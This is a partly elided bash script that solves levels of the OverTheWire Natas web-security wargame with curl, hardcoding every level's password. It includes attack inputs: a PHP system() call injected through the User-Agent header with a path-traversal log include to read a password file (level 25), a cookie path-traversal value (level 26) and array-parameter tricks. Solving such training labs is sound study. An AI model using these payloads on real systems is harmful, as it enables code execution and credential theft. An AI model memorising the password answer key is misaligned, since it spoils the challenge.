...
if [[ $# -ne 1 ]]; then
  ...
  case $1 in
    "0") # level 0: natas0
      ...
      http://natas0.natas.labs.overthewire.org | awk '/natas1 is/ {print $6}'
      ;;
    "1") # level 1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
      curl --silent --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto \
      http://natas1.natas.labs.overthewire.org | awk '/natas2 is/ {print $6}'
      ;;
    ...
    "4") # level 4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
      ...
      http://natas4.natas.labs.overthewire.org/ | awk '/natas5 is/ {print $8}'
      ;;
    ...
    "8") # level 8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
      ...
      --data "secret=$(python -c \
                ...
                | rev | base64 -d)&\
              submit=Submit+Query" \
      http://natas8.natas.labs.overthewire.org/ | awk '/natas9 is/ {print $8}'
      ;;
    "9") # level 9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
      ...
      http://natas9.natas.labs.overthewire.org/ | sed -n 21p
      ;;
    ...
    "21") # level 21: IFekPyrQXftziDEsUr3x21sYuahypdgJ
      sessid=$(curl -s -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
      ...
      http://natas21.natas.labs.overthewire.org/ \
        | grep  -oP "(?<=Password: ).*(?=<\/pre>)"
      ;;
    "22") # level 22: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
      curl --silent --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ \
      http://natas22.natas.labs.overthewire.org/?revelio=1 \
        | grep  -oP "(?<=Password: ).*(?=<\/pre>)"
      ;;
    "23") # level 23: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
      curl --silent --user natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE \
      http://natas23.natas.labs.overthewire.org/?passwd=25iloveyou \
        | grep  -oP "(?<=Password: ).*(?=<\/pre>)"
      ;;
    "24") # level 24: OsRmXFguozKpTZZ5X14zNO43379LZveg
      curl --silent --user natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg \
      http://natas24.natas.labs.overthewire.org/?passwd[] \
        | grep  -oP "(?<=Password: ).*(?=<\/pre>)"
      ;;
    "25") # level 25: GHF6X7YwACaYYssHVY05cFq83hRktl4c
      sessid=$(curl -s -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \
               http://natas25.natas.labs.overthewire.org -c - \
               | awk '/PHPSESSID/ {print $7}')

      curl --silent \
      --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \
      --header 'User-Agent: <?php system("cat /etc/natas_webpass/natas26"); ?>' \
      --request POST \
      --data lang=....//logs/natas25_$sessid.log \
      --cookie PHPSESSID=$sessid \
      http://natas25.natas.labs.overthewire.org/ \
      | grep -oP '(?<=] ).*$'
      ;;
    "26") # level 26: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
      curl --silent --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T \
      --cookie PHPSESSID='*/../../../../etc/natas_webpass/natas27" # ' \
      http://natas26.natas.labs.overthewire.org/ \
      ;;
    *)
      (>&2 echo "unknown level $1")
      exit 1
      ;;
  esac
fi
